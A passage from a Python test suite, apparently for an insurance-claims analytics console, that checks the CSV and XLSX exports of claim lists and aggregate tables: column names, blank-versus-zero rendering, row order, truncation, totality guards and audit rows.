"""Story 7.5 — what leaves the console, and what it says about having left.

Three halves, `test_financial_decomposition.py`'s arrangement with one more.

**The pure half is about rendering, not about folding.** Nothing in
`services/worklist/export.py` computes a figure — every target is handed an
already-computed aggregate — so what can go wrong there is the *file*: a column
renamed, a cell rendered as `None` instead of blank, a boolean written as `1`, a
truncated series exported untruncated, an empty table losing its header. Those
are exercised over synthetic aggregates built by hand, because the seeded book
cannot produce most of them: no seeded dimension has more than twelve groups, so
the cut is never reached; no seeded cohort is empty, so the `None` average never
renders; and the seed's band distribution has all three bands occupied, so the
zero-fill never has to survive a round trip.

**The DB half is about agreement.** The one claim this story makes is that an
exported figure cannot differ from the displayed one, and the only checkable form
of that is equality against the sibling route's own payload —
`test_the_claim_export_is_every_page_of_the_list` walks
`GET /dashboard/claims` to exhaustion and asserts the file holds exactly those
claim ids in exactly that order, and each aggregate export is compared against
its card's JSON. The read counts are guarded in both directions for the reason
7.1–7.4 each guarded theirs: an export that took a second read would be the first
analyst surface to do so without saying why.

**The audit half is about what the row does *not* say.** A content-free event is
not a claim about key names, it is a claim about values, so the assertion is a
scan of the serialised payload for a seeded worker's name and a seeded employer
label — `test_ai_insights.py:997` is the idiom. Beside it sit the two facts a
compliance reader actually needs: exactly one row per successful export, and
*none* for a refused one.

**Scope is asserted at the service level**, with hand-built `CallerContext`s, for
the reason 7.1, 7.2, 7.3 and 7.4 each recorded rather than papered over: the
seed's one analyst is `scope_all`, so no HTTP request in this codebase can
demonstrate a *narrowed* analyst, and seeding one moves persona counts in three
earlier stories plus the e2e login fixture. This story was named in
`deferred-work.md` as the candidate that would close that gap and declines it
again, with the stakes now higher — an export audit row names an actor and a
filter set, and the composition of a narrowed analyst's book is still inferred.
The entry is re-recorded there rather than quietly dropped.
"""

import dataclasses
import io
import json
import xml.etree.ElementTree as ET
import zipfile
from collections.abc import AsyncIterator, Awaitable, Callable, Mapping, Sequence
from contextlib import asynccontextmanager
from datetime import date, timedelta
from typing import Any, Final

import httpx
import pytest
import sqlalchemy as sa
from hypothesis import given
from hypothesis import settings as hyp_settings
from hypothesis import strategies as st
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine

from api import create_app
from config import Settings
from data.context import ALL_EMPLOYERS, CallerContext
from data.models import AppUser, AuditEvent
from data.models.enums import (
    ClaimStatus,
    Disability,
    Gender,
    RecoveryWindow,
    ReturnStatus,
    Stage,
    UserRole,
)
from data.repositories import claims as claim_repo
from data.repositories.identity import employer_ids_for
from rules.parameters import (
    DerivationThresholds,
    ExportLimits,
    RuleParameterError,
    export_limits_for,
    reserve_bands_for,
    thresholds_for,
    trend_periods_for,
    weights_for,
)
from services import audit as audit_module
from services.derivations import AgeBand, FraudBand, RiskBand
from services.financials import ReserveVerdict
from services.worklist import export as export_module
from services.worklist import fraud as fraud_service
from services.worklist.charts import CategoryCount, Distribution
from services.worklist.decomposition import (
    BREAKDOWN_LIMIT,
    BreakdownDimension,
    BreakdownGroup,
    CostDriverCohort,
    CostDriverPair,
    FinancialBreakdown,
    FinancialClaim,
    FinancialDecomposition,
    MoneyTotals,
    ReserveAdequacy,
    VerdictCount,
)
from services.worklist.drill_through import (
    DrillClaim,
    DrillFilters,
    DrillFlags,
    RankedClaim,
    select,
)
from services.worklist.export import (
    MEDIA_TYPE,
    ExportColumn,
    ExportFormat,
    ExportTable,
    ExportTarget,
    ExportTooLarge,
    ExportUnit,
    claims_table_of,
    cost_drivers_table_of,
    export_claims,
    export_financials,
    export_fraud,
    export_fraud_rates,
    export_reserve_adequacy,
    export_trends,
    filename_for,
    financial_breakdown_table_of,
    fraud_bands_table_of,
    fraud_rates_table_of,
    render_csv,
    render_xlsx,
    reserve_adequacy_table_of,
    siu_pipeline_table_of,
    trend_series_table_of,
)
from services.worklist.fraud import (
    EmployerRate,
    FraudPanel,
    FraudRates,
    FraudRateSort,
    FraudRateSorts,
    HandlerCount,
    HandlerRate,
    InjuryTypeRate,
    RateBreakdown,
)
from services.worklist.segmentation import (
    Segmentation,
    VocabularyDivergence,
    to_drill_filters,
)
from services.worklist.trends import PortfolioTrends, TrendAnchor, TrendCohort, TrendGrain
from tests import seed_fixture
from tests.conftest import requires_db

SETTINGS = Settings(database_url="postgresql://unused", env="e2e")  # type: ignore[arg-type]

ANALYST = ("David Bline", "analyst")
SUPERVISOR = ("David Bline", "supervisor")
HANDLER = ("Kaya Johnson", "handler")

DRILL = "/dashboard/claims"
CLAIMS_EXPORT = "/dashboard/claims/export"
FRAUD_EXPORT = "/dashboard/fraud/export"
FRAUD_RATES_EXPORT = "/dashboard/fraud/rates/export"
TRENDS_EXPORT = "/dashboard/trends/export"
FINANCIALS_EXPORT = "/dashboard/financials/export"
ADEQUACY_EXPORT = "/dashboard/financials/reserve-adequacy/export"

#: Every export route with the parameters that make it answer, for the checks
#: that are about *all six* rather than about one — the role gate, the cache
#: header, the media type, the disposition and the audit row.
#:
#: A tuple of `(path, params)` rather than a bare path list, because two of the
#: six take a mandatory `table` and a bare list would have quietly excluded them
#: from every parametrised check by 422ing instead of 200ing.
EXPORT_ROUTES: tuple[tuple[str, dict[str, str]], ...] = (
    (CLAIMS_EXPORT, {}),
    (FRAUD_EXPORT, {"table": "bands"}),
    (FRAUD_EXPORT, {"table": "siuPipeline"}),
    (FRAUD_RATES_EXPORT, {}),
    (TRENDS_EXPORT, {}),
    (FINANCIALS_EXPORT, {"table": "breakdown"}),
    (FINANCIALS_EXPORT, {"table": "costDrivers"}),
    (ADEQUACY_EXPORT, {}),
)

#: The ten segmentation dimensions as the wire spells them, written out.
#:
#: Restated rather than read off `SEGMENTATION_WIRE_KEYS`, for the reason every
#: contract block in this suite restates its vocabulary: an allowlist derived
#: from the code under test would agree with it however either moved.
SEGMENTATION_PARAMETERS = (
    "severityBand",
    "injuryType",
    "state",
    "employerId",
    "disability",
    "sector",
    "region",
    "icd10",
    "ageGroup",
    "gender",
)

#: The twenty-five drill facets as the wire spells them, written out for the same
#: reason. `test_drill_through.py` holds the same list against the paged route;
#: this copy is what makes "the list and its export declare the same facets" an
#: assertion rather than an inheritance.
DRILL_PARAMETERS = (
    "stage",
    "severityBand",
    "fraudFlagged",
    "litigation",
    "surgery",
    "oshaRecordable",
    "recoveryStatus",
    "injuryType",
    "state",
    "employerId",
    "handlerId",
    "priority",
    "fraudBand",
    "siuReview",
    "fnolFrom",
    "fnolTo",
    "doiFrom",
    "doiTo",
    "disability",
    "sector",
    "region",
    "icd10",
    "ageGroup",
    "gender",
    "reserveVerdict",
)

#: One filter set the seeded portfolio genuinely narrows on, as the URL spells it.
#:
#: One stored column and one *derived* band, `test_financial_decomposition.py`'s
#: pair and its reason: it is what makes "exported over the intersection" a real
#: intersection rather than two readings of one column.
TWO_DIMENSIONS = {"filter[sector]": "Aerospace", "filter[severityBand]": "high"}

SEEDED_CLAIMS = 100


# --- the pure half: synthetic aggregates ----------------------------------


def _thresholds() -> DerivationThresholds:
    """The threshold block the pure half folds with — every edge restated.

    Never `await thresholds_for(db)`: a pure test that loaded the document under
    test would be asserting the fold against whatever the document happens to
    say, which is the one thing a rules tier is for and the one thing a unit test
    must not depend on.
    """
    return DerivationThresholds(
        version=7,
        risk_high_min=65,
        risk_med_min=35,
        siu_fraud_score_min=60,
        rtw_blocked_hash_modulus=5,
        payment_due_hash_modulus=3,
        treatment_early_max_ratio=0.3,
        treatment_active_max_ratio=0.7,
        recovery_year_expected_days=180,
        recovery_default_expected_days=42,
        path_minor_severity_max=35,
        path_minor_recovery_windows=frozenset({RecoveryWindow.weeks_0_2}),
        path_fatality_severity_min=100,
        ptd_severity_threshold=85,
        fraud_flag_score_min=55,
        fraud_band_high_min=55,
        fraud_band_med_min=35,
        age_younger_min=35,
        age_older_min=45,
        age_oldest_min=55,
    )


def _drill_claim(claim_id: str = "WC-0001", **overrides: Any) -> DrillClaim:
    """A `DrillClaim` with every field named, so a test overrides one thing.

    Twenty-eight fields, and a helper rather than twenty-eight keyword arguments
    at each call site for the reason the projection is built named in the service:
    five adjacent free-text columns and four adjacent booleans all type-check in
    any order, so a positional fixture would let a test pass while asserting the
    wrong column.
    """
    fields: dict[str, Any] = {
        "claim_id": claim_id,
        "stage": Stage.treatment,
        "status": ClaimStatus.ch_approved,
        "return_status": ReturnStatus.under_treatment,
        "severity_score": 52,
        "days_open": 40,
        "injury_type": "Fall from Height",
        "worker_name": "Derek Hill",
        "employer_short_name": "Boeing",
        "surgery_required": True,
        "litigation_flag": False,
        "fraud_flag": False,
        "fraud_score": 37,
        "employer_id": 2,
        "handler_id": 4,
        "handler_name": "Dante Reyes",
        "state": "WA",
        "osha_recordable": True,
        "froi_date": date(2026, 3, 24),
        "doi": date(2026, 3, 22),
        "disability": Disability.temporary,
        "sector": "Aerospace",
        "region": "Northwest",
        "icd": "W17.89XA",
        "age": 38,
        "gender": Gender.male,
        "reserve": 2_234_900,
        "recovery": RecoveryWindow.weeks_6_8,
    }
    fields.update(overrides)
    return DrillClaim(**fields)


def _drill_flags(**overrides: Any) -> DrillFlags:
    """The eight derived values a ranked row carries, likewise named."""
    fields: dict[str, Any] = {
        "risk": RiskBand.med,
        "siu_review": False,
        "rtw_blocked": True,
        "payment_due": True,
        "fraud_flagged": False,
        "fraud_band": FraudBand.medium,
        "age_group": AgeBand.younger,
        "reserve_verdict": None,
    }
    fields.update(overrides)
    return DrillFlags(**fields)


def _distribution(items: Sequence[CategoryCount]) -> Distribution[CategoryCount]:
    return Distribution(
        items=tuple(items),
        total=sum(item.count for item in items),
        total_categories=len(items),
        truncated=False,
        limit=None,
    )


def _panel(
    bands: Sequence[CategoryCount],
    stages: Sequence[CategoryCount] = (),
    handlers: Sequence[HandlerCount] = (),
) -> FraudPanel:
    """A `FraudPanel` built by hand, so the two fraud folds can be exercised
    over distributions the seeded book cannot produce."""
    return FraudPanel(
        by_band=_distribution(bands),
        siu_by_stage=_distribution(stages),
        siu_by_handler=Distribution(
            items=tuple(handlers),
            total=sum(item.count for item in handlers),
            total_categories=len(handlers),
            truncated=False,
            limit=None,
        ),
        claims_in_scope=sum(item.count for item in bands),
        flagged_claims=0,
        siu_claims=sum(item.count for item in stages),
        fraud_band_high_min=55,
        fraud_band_med_min=35,
        fraud_flag_score_min=55,
        siu_fraud_score_min=60,
    )


def _rate_breakdown[RowT](
    items: Sequence[RowT], limit: int | None = None, total_categories: int | None = None
) -> RateBreakdown[RowT]:
    return RateBreakdown(
        items=tuple(items),
        total_categories=total_categories if total_categories is not None else len(items),
        truncated=total_categories is not None and total_categories > len(items),
        limit=limit,
        sort=FraudRateSort.rate_desc,
    )


def _totals(paid: int = 0, reserve: int = 0) -> MoneyTotals:
    return MoneyTotals(paid_cents=paid, reserve_cents=reserve, projected_cents=paid + reserve)


def _decomposition(
    groups: Sequence[BreakdownGroup],
    group_count: int | None = None,
    surgery: CostDriverPair | None = None,
) -> FinancialDecomposition:
    """A `FinancialDecomposition` built by hand — the truncation and the empty
    cohort are the two states the seeded book cannot reach."""
    count = group_count if group_count is not None else len(groups)
    empty = CostDriverCohort(
        key="true", claim_count=0, totals=_totals(), average_projected_cents=None
    )
    full = CostDriverCohort(
        key="false", claim_count=2, totals=_totals(paid=100, reserve=50), average_projected_cents=75
    )
    pair = surgery or CostDriverPair(facet="surgery", with_driver=empty, without_driver=full)
    return FinancialDecomposition(
        totals=_totals(paid=100, reserve=50),
        claims_in_scope=2,
        breakdown=FinancialBreakdown(
            dimension=BreakdownDimension.employerId,
            items=tuple(groups),
            group_count=count,
            truncated=count > len(groups),
            limit=BREAKDOWN_LIMIT,
        ),
        surgery=pair,
        litigation=CostDriverPair(facet="litigation", with_driver=empty, without_driver=full),
    )


def _csv_rows(table: ExportTable) -> list[list[str]]:
    """The rendered CSV, parsed back into rows — the file as a consumer sees it.

    Parsed with the stdlib reader rather than split on commas, deliberately: a
    quoted field containing a comma is exactly what RFC 4180 quoting exists for
    and exactly what a naive split would silently mis-read, and the seeded
    injury types and plant names contain both commas and en dashes.
    """
    payload = b"".join(render_csv(table)).decode("utf-8")
    import csv as _csv

    return [row for row in _csv.reader(io.StringIO(payload, newline=""))]


def _xlsx_rows(payload: bytes) -> list[list[str]]:
    """The worksheet, read back with `zipfile` and `xml.etree` — never xlsxwriter.

    **A reader that is the writer proves nothing.** `xlsxwriter` has no reader,
    which is convenient, but the discipline is the point rather than the
    convenience: the assertion these rows serve is "a spreadsheet application
    opening this file sees the CSV's values", and the only honest way to check it
    is to open the container the way the format specifies rather than to ask the
    library what it thinks it wrote.

    Blank cells are absent from the XML — that is how XLSX spells a null — so the
    rows are rebuilt by column *reference* (`A1`, `C4`) rather than by position,
    and a missing cell becomes the empty string the CSV writes. A parser that
    read cells in document order would silently shift every field after a blank.

    Numbers come back through `str(int(...))` because a number cell holds the
    *value* rather than the lexical form — `52` may be written `52` and read
    `52.0` — and every number this writer emits is an integer by construction
    (`render_xlsx` writes the one float as text, precisely so this comparison
    needs no normalisation that could hide a real divergence).
    """
    namespace = "{http://schemas.openxmlformats.org/spreadsheetml/2006/main}"
    with zipfile.ZipFile(io.BytesIO(payload)) as archive:
        names = archive.namelist()
        shared: list[str] = []
        if "xl/sharedStrings.xml" in names:
            root = ET.fromstring(archive.read("xl/sharedStrings.xml"))
            shared = ["".join(node.itertext()) for node in root.findall(f"{namespace}si")]
        sheet = ET.fromstring(archive.read("xl/worksheets/sheet1.xml"))

    def column_index(reference: str) -> int:
        letters = "".join(char for char in reference if char.isalpha())
        index = 0
        for char in letters:
            index = index * 26 + (ord(char) - ord("A") + 1)
        return index - 1

    sparse: list[dict[int, str]] = []
    for row_node in sheet.iter(f"{namespace}row"):
        cells: dict[int, str] = {}
        for cell in row_node.findall(f"{namespace}c"):
            reference = cell.get("r") or "A1"
            value_node = cell.find(f"{namespace}v")
            if value_node is None or value_node.text is None:
                continue
            raw = value_node.text
            if cell.get("t") == "s":
                cells[column_index(reference)] = shared[int(raw)]
            else:
                cells[column_index(reference)] = str(int(float(raw)))
        sparse.append(cells)
    # Padded to the **sheet's** width rather than to each row's own, because a
    # trailing blank writes no cell at all: a row whose last value is `None`
    # would otherwise come back one column short and compare unequal to a CSV
    # that ends in a comma. The header row always spans the full width — column
    # names are strings and a string is never omitted — so the maximum is it.
    width = max((max(cells) + 1 for cells in sparse if cells), default=0)
    return [[cells.get(index, "") for index in range(width)] for cells in sparse]


def test_the_claim_export_publishes_the_drill_projection_and_its_derived_values() -> None:
    """Thirty-six columns, in one order, named as the database names them.

    Compared against `seed_fixture.EXPORT_CLAIM_COLUMNS` — a list written out in
    the oracle rather than read off the service — so a renamed, reordered or
    dropped column is a failure here rather than a spreadsheet that no longer
    joins. The set *and* the sequence, because a consumer reading a positional
    file cares about both.

    `reserve_verdict` is deliberately absent, and asserted absent: it is loaded
    only when its facet is set, so a column for it would be blank on almost every
    export and a blank a consumer cannot tell from an answer is the worst of the
    three options.
    """
    table = claims_table_of(
        [RankedClaim(claim=_drill_claim(), flags=_drill_flags(), priority_score=1.0)]
    )

    assert [column.name for column in table.columns] == list(seed_fixture.EXPORT_CLAIM_COLUMNS)
    assert "reserve_verdict" not in {column.name for column in table.columns}
    assert table.target is ExportTarget.claims


def test_a_claim_row_renders_money_dates_booleans_and_enums_as_the_story_says() -> None:
    """One row, every rendering rule the story names, in one assertion.

    Money as integer **cents** under a `*_cents` header, dates ISO-8601, enums as
    the stored snake_case value rather than the UI's label, booleans as
    `true`/`false` rather than `True`/`False` or `1`/`0`. The last is the one
    worth a test of its own reason: `True` is an `int` in Python, so a renderer
    that tested `isinstance(value, int)` first would write `1` — and a `1` in a
    boolean column is a value a spreadsheet will happily sum.
    """
    row = _csv_rows(
        claims_table_of(
            [RankedClaim(claim=_drill_claim(), flags=_drill_flags(), priority_score=42.5)]
        )
    )[1]
    cells = dict(zip(seed_fixture.EXPORT_CLAIM_COLUMNS, row, strict=True))

    assert cells["reserve_cents"] == "2234900"
    assert cells["froi_date"] == "2026-03-24"
    assert cells["stage"] == "treatment"
    assert cells["recovery"] == "weeks_6_8"
    assert cells["surgery_required"] == "true"
    assert cells["litigation_flag"] == "false"
    assert cells["risk_band"] == "med"
    assert cells["age_group"] == "younger"
    assert cells["priority_score"] == "42.5"


def test_the_claim_export_keeps_the_order_it_was_ranked_in() -> None:
    """The file is the list, in the list's order — never re-sorted here.

    `select` ranks; this fold tuples. Asserted by handing it a sequence in an
    order no sort would produce (descending claim id against ascending score) and
    checking the file preserves it, which a fold that re-sorted on any column
    could not.
    """
    ranked = [
        RankedClaim(claim=_drill_claim("WC-0009"), flags=_drill_flags(), priority_score=1.0),
        RankedClaim(claim=_drill_claim("WC-0003"), flags=_drill_flags(), priority_score=9.0),
        RankedClaim(claim=_drill_claim("WC-0007"), flags=_drill_flags(), priority_score=5.0),
    ]

    assert [row[0] for row in claims_table_of(ranked).rows] == ["WC-0009", "WC-0003", "WC-0007"]


def test_an_empty_export_is_a_header_row_and_nothing_else() -> None:
    """A filter no claim satisfies is a file, not an absent file.

    Zero rows and a header, on every one of the eight targets that can be empty.
    A zero-byte download is indistinguishable from a failed one, and an empty
    segment is a 200 — `DrillFilters`' ruling that an unsatisfiable combination
    is a well-formed question whose answer is "none", arriving as a file.
    """
    rendered = _csv_rows(claims_table_of([]))

    assert rendered == [list(seed_fixture.EXPORT_CLAIM_COLUMNS)]


def test_the_band_export_carries_every_band_including_an_empty_one() -> None:
    """Zero-filled, because the panel is — three rows over a two-band book.

    The seeded portfolio occupies all three bands, so this state is unreachable
    from the database and is exactly the state that matters: a two-row
    spreadsheet cannot be told from a three-row one that lost a row, and the
    reassuring reading is the wrong one.
    """
    table = fraud_bands_table_of(
        _panel(
            [
                CategoryCount(key="high", count=0),
                CategoryCount(key="medium", count=4),
                CategoryCount(key="low", count=7),
            ]
        )
    )

    assert [column.name for column in table.columns] == list(seed_fixture.EXPORT_FRAUD_BAND_COLUMNS)
    assert table.rows == (("high", 0), ("medium", 4), ("low", 7))


def test_the_siu_pipeline_export_names_the_grouping_on_every_row() -> None:
    """Two series, one rectangular file, stages before handlers.

    `dimension` is repeated rather than stated once because a rectangular file
    has nowhere to put a scalar — the alternative is the preamble row this export
    refuses. `label` is blank for a stage and a name for a handler, which is the
    id-is-not-a-name split every payload in this console makes.
    """
    table = siu_pipeline_table_of(
        _panel(
            [CategoryCount(key="low", count=1)],
            stages=[CategoryCount(key="investigation", count=2)],
            handlers=[HandlerCount(handler_id=4, handler_name="Dante Reyes", count=2)],
        )
    )

    assert _csv_rows(table) == [
        ["dimension", "key", "label", "claims"],
        ["stage", "investigation", "", "2"],
        ["handler", "4", "Dante Reyes", "2"],
    ]


def test_the_rate_export_keeps_the_cards_own_truncation() -> None:
    """Eight injury types out of twenty, because the card shows eight.

    The rows arrive already cut by `fraud._breakdown`; this fold exports what it
    was handed. A test that fed it a truncated breakdown and expected the whole
    tail would be asking the export to make the ranking decision the card makes,
    which is the second computer this module exists not to be.
    """
    table = fraud_rates_table_of(
        FraudRates(
            by_injury_type=_rate_breakdown(
                [InjuryTypeRate(injury_type="Burn", flagged=1, claims=4, rate_bp=2_500)],
                limit=8,
                total_categories=20,
            ),
            by_employer=_rate_breakdown(
                [EmployerRate(employer_id=2, label="Boeing", flagged=0, claims=9, rate_bp=0)]
            ),
            by_handler=_rate_breakdown(
                [
                    HandlerRate(
                        handler_id=4, handler_name="Dante Reyes", flagged=2, claims=8, rate_bp=2_500
                    )
                ]
            ),
            claims_in_scope=21,
            flagged_claims=3,
            fraud_flag_score_min=55,
        )
    )

    assert _csv_rows(table) == [
        ["dimension", "key", "label", "flagged", "claims", "rate_bp"],
        ["injury_type", "Burn", "Burn", "1", "4", "2500"],
        ["employer", "2", "Boeing", "0", "9", "0"],
        ["handler", "4", "Dante Reyes", "2", "8", "2500"],
    ]


def test_the_breakdown_export_is_cut_where_the_card_is_cut() -> None:
    """Twelve rows out of thirty-four, and no thirteenth invented here.

    The card's caption says "top 12 of 34" and the file has to be the twelve. A
    fold that exported the whole segment would be publishing a set the caption
    contradicts *and* ranking it itself.
    """
    groups = [
        BreakdownGroup(key=str(index), label=f"E{index}", claim_count=1, totals=_totals(paid=index))
        for index in range(BREAKDOWN_LIMIT)
    ]
    table = financial_breakdown_table_of(_decomposition(groups, group_count=34))

    assert [column.name for column in table.columns] == list(seed_fixture.EXPORT_BREAKDOWN_COLUMNS)
    assert len(table.rows) == BREAKDOWN_LIMIT
    assert table.rows[0] == ("employerId", "0", "E0", 1, 0, 0, 0)


def test_an_empty_cohorts_average_is_blank_and_never_zero() -> None:
    """`None` renders as the empty field — the sentinel, carried into the file.

    Unreachable from the seeded book, where no cohort is empty, and the reason
    the pure half exists. A cohort reporting `0` in a spreadsheet is a cohort
    that costs nothing, and the reader who sums that column has no way to know
    otherwise.
    """
    rows = _csv_rows(cost_drivers_table_of(_decomposition([])))

    assert rows[0] == [
        "facet",
        "cohort",
        "claim_count",
        "paid_cents",
        "reserve_cents",
        "projected_cents",
        "average_projected_cents",
    ]
    assert rows[1] == ["surgery", "true", "0", "0", "0", "0", ""]
    assert rows[2] == ["surgery", "false", "2", "100", "50", "150", "75"]
    # Four rows, because each pair partitions the book: a file carrying only the
    # driver side would let a reader compare a cohort against a total containing it.
    assert len(rows) == 5


def test_the_adequacy_export_carries_all_five_verdicts_in_declaration_order() -> None:
    """Five rows, zero-filled, in `ReserveVerdict`'s order — the vocabulary is
    a rule's answer and is complete for every book."""
    adequacy = ReserveAdequacy(
        items=tuple(VerdictCount(verdict=verdict, count=0) for verdict in ReserveVerdict),
        total=0,
        claims_in_scope=0,
        light_ratio_bp=11_500,
        heavy_ratio_bp=6_000,
        bands_version=1,
    )

    assert reserve_adequacy_table_of(adequacy).rows == (
        ("light", 0),
        ("adequate", 0),
        ("heavy", 0),
        ("closed_final", 0),
        ("indeterminate", 0),
    )


def _trends(cohort: TrendCohort = TrendCohort.none) -> PortfolioTrends:
    """A real `PortfolioTrends` from the module's own window arithmetic.

    Built rather than hand-assembled, unlike the other four aggregates, and the
    difference is the shape: a trend payload is a window, five metrics and a
    cohort split, and hand-writing one would be transcribing `window_for`'s
    calendar into this file — a second implementation of the one thing this
    story does *not* touch.
    """
    from rules.parameters import TrendPeriods
    from services.worklist import sla
    from services.worklist.trends import _Computers, trends_of, window_for

    periods = TrendPeriods(version=1, default_buckets=2, max_buckets=24, low_confidence_claim_max=3)
    as_of = date(2026, 6, 15)
    window = window_for(TrendGrain.month, periods, as_of, None, None)
    return trends_of(
        [],
        window,
        TrendAnchor.fnol,
        cohort,
        _Computers.of(_thresholds()),
        sla.targets_for(SETTINGS),
        periods,
        as_of,
    )


def test_the_trend_export_is_long_form_and_never_hides_an_absent_value() -> None:
    """One row per (series, bucket), with an empty cell where a mean is absent.

    Long form rather than one column per period, so one header serves every
    window. The empty `value` is `TrendPoint`'s prohibition in the file: a
    settlement mean over a month in which nothing settled is not zero days, and a
    CSV that said `0` would be the line drawn through zero saved to disk where
    nobody can see the caption that would have explained it.
    """
    rows = _csv_rows(trend_series_table_of(_trends()))
    header = rows[0]

    assert header == [
        "metric",
        "cohort_key",
        "cohort_label",
        "bucket_key",
        "bucket_label",
        "bucket_from",
        "bucket_to",
        "value",
        "claim_count",
        "low_confidence",
        "partial",
    ]
    # Five metrics over a two-bucket window, unsplit: ten rows, every cohort cell
    # blank because `cohort=none` is a value the payload states rather than omits.
    assert len(rows) == 11
    assert all(row[1] == "" and row[2] == "" for row in rows[1:])
    # `avgSettlementDays` over an empty book has nothing to average.
    settlement = [row for row in rows[1:] if row[0] == "avg_settlement_days"]
    assert settlement and all(row[7] == "" for row in settlement)
    # …while `volume` genuinely observed zero claims and says so.
    volume = [row for row in rows[1:] if row[0] == "volume"]
    assert volume and all(row[7] == "0" for row in volume)


# --- the guards, and whether they would notice ----------------------------


def test_a_money_column_must_carry_its_unit_in_its_name() -> None:
    """The structural half of "money leaves as integer cents".

    A rule stated in three specs and enforced nowhere is a rule a ninth column
    breaks. The failure it prevents is silent and expensive: a `total_paid`
    column of cents read as dollars is a spreadsheet wrong by two orders of
    magnitude that looks entirely plausible.
    """
    with pytest.raises(ValueError, match="paid_total"):
        ExportColumn("paid_total", ExportUnit.cents)


def test_a_unitless_column_may_not_wear_a_units_suffix() -> None:
    """The check runs both ways, which is the half that would otherwise rot.

    A column *named* `reserve_cents` and declared unitless would satisfy a
    one-way check and would be exactly the drift the rule exists to stop: the
    header promises a scale nothing in the code believes in.
    """
    with pytest.raises(ValueError, match="reserve_cents"):
        ExportColumn("reserve_cents")


def test_the_unit_guard_accepts_the_columns_the_service_actually_declares() -> None:
    """The guard's own "would notice" test — a check that only ever reads clean
    files cannot tell "nothing is wrong" from "nothing is checked".

    Every column of every one of the eight folds is constructed at import time,
    so this passing is already evidence the guard is satisfiable; what it adds is
    that the guard is *reached* — a `__post_init__` accidentally deleted would
    leave the two refusals above failing, and a `__post_init__` that never
    compared anything would leave them failing too, but a guard that compared the
    wrong thing could leave both refusals green and every real column rejected.
    """
    assert ExportColumn("paid_cents", ExportUnit.cents).unit is ExportUnit.cents
    assert ExportColumn("rate_bp", ExportUnit.basis_points).unit is ExportUnit.basis_points
    assert ExportColumn("claim_count").unit is None


def test_a_row_that_does_not_match_its_header_is_refused() -> None:
    """A positional row shorter or longer than the header shifts every field
    after it, silently, halfway down a file."""
    with pytest.raises(ValueError, match="row 1"):
        ExportTable(
            target=ExportTarget.claims,
            columns=(ExportColumn("a"), ExportColumn("b")),
            rows=(("x", "y"), ("z",)),
        )


def test_the_row_width_guard_would_notice_a_late_row() -> None:
    """Every row is checked, not the first — because the row that goes wrong is
    the one whose branch is rare.

    A guard that validated `rows[0]` alone would pass the table below, which is
    the shape a `None` label or an empty cohort actually produces: the common
    branch is right and the rare one is short.
    """
    with pytest.raises(ValueError, match="row 2"):
        ExportTable(
            target=ExportTarget.claims,
            columns=(ExportColumn("a"),),
            rows=(("x",), ("y",), ("z", "extra")),
        )


def test_every_export_target_has_a_fold_and_a_route() -> None:
    """The two import-time guards, asserted from the outside.

    `services/worklist/export.py` pins `ExportTarget` to the folds that shape it
    and `api/routers/dashboard.py` pins it to the routes that reach it. Between
    them, a ninth member cannot be added without a fold and a way in — the
    failure being a target the router can name and nothing can shape, or a fold
    nothing can reach.
    """
    from api.routers import dashboard as dashboard_router

    assert frozenset(export_module._DISPATCHED) == frozenset(ExportTarget)
    assert frozenset(dashboard_router._EXPORT_TARGETS.values()) == frozenset(ExportTarget)
    assert len(dashboard_router._EXPORT_TARGETS) == len(ExportTarget)


def test_every_export_format_has_a_media_type() -> None:
    """The third of the import-time guards, and the one that had to be added.

    `MEDIA_TYPE` had no totality check while `_DISPATCHED` and `_EXPORT_TARGETS`
    both did, and a third `ExportFormat` member would have found the gap twice
    over: `MEDIA_TYPE[fmt]` in `_download` is a `KeyError` per request, and the
    `fmt is ExportFormat.csv else …` branch beside it would have rendered the new
    format as XLSX under a filename promising otherwise.
    """
    assert frozenset(MEDIA_TYPE) == frozenset(ExportFormat)


@pytest.mark.parametrize(
    ("table", "vocabulary", "expected"),
    [
        ({ExportFormat.csv: "text/csv"}, ExportFormat, "xlsx"),
        (
            {target: object() for target in ExportTarget} | {"ninth": object()},
            ExportTarget,
            "ninth",
        ),
    ],
)
def test_the_totality_guard_would_notice_a_missing_or_extra_entry(
    table: Mapping[Any, object], vocabulary: type[Any], expected: str
) -> None:
    """The guard fires, rather than merely holding today.

    An import-time check cannot be re-triggered from a test — the module is
    already imported — so the two assertions above say only that the tables are
    total *now*. This hands `_require_total` the two shapes divergence actually
    takes and watches it refuse: a member with no entry (a format nothing can be
    served as) and an entry with no member (a fold nothing can reach). The
    message names the offender, because a guard that fires without saying what
    is missing sends the next reader to diff two lists by eye.
    """
    with pytest.raises(VocabularyDivergence, match=expected):
        export_module._require_total(table, vocabulary, "a table under test")


def test_the_route_table_guard_names_the_target_two_routes_claim() -> None:
    """The duplicate branch, which used to print an empty list.

    `_EXPORT_TARGETS` is checked two ways — every target reachable, and no two
    routes resolving to one — and the second clause exists for a case the first
    cannot see: eight targets all covered, but one of them claimed twice and
    another route therefore unrouted. The mapping below is exactly that, and the
    old message read `…have diverged: []` on it, because the symmetric difference
    of two equal sets is empty. Naming the duplicated target is the difference
    between a guard that stops the process and a guard that stops the process
    usefully.
    """
    from api.routers import dashboard as dashboard_router

    doubled = dict(dashboard_router._EXPORT_TARGETS)
    doubled[("/dashboard/fraud/export", "siuPipeline")] = ExportTarget.fraud_bands

    complaint = dashboard_router._export_target_divergence(doubled)

    assert complaint is not None
    assert "fraud_bands" in complaint
    assert "siu_pipeline" in complaint
    # …and the real table is silent, which is what the import-time raise depends on.
    assert dashboard_router._export_target_divergence(dashboard_router._EXPORT_TARGETS) is None


def test_a_target_is_shaped_by_the_fold_the_registry_names() -> None:
    """The registry is **consulted**, not merely checked.

    The failure this closes is quiet: the two multi-target entry points used to
    ask `if target is ExportTarget.fraud_bands else siu_pipeline_table_of(...)`,
    so a ninth member registered in `_DISPATCHED` perfectly correctly would still
    have fallen into the `else` and exported the wrong table — under an audit row
    naming the target the caller asked for. A guard over a table nothing
    dispatches through proves only that somebody typed a name twice.

    Observed by replacing one entry and watching the replacement come back. That
    can only pass if `_shape` reads the mapping, which is why it is the whole
    test.
    """
    sentinel = ExportTable(
        target=ExportTarget.siu_pipeline,
        columns=(ExportColumn("sentinel"),),
        rows=(("dispatched",),),
    )
    panel = _panel([CategoryCount(key="low", count=1)])

    with pytest.MonkeyPatch.context() as patch:
        # The registry is replaced wholesale rather than one key poked, because a
        # `Mapping` is not mutable — and because that is the honest thing to
        # patch: the claim is that `_shape` reads *this* object.
        patch.setattr(
            export_module,
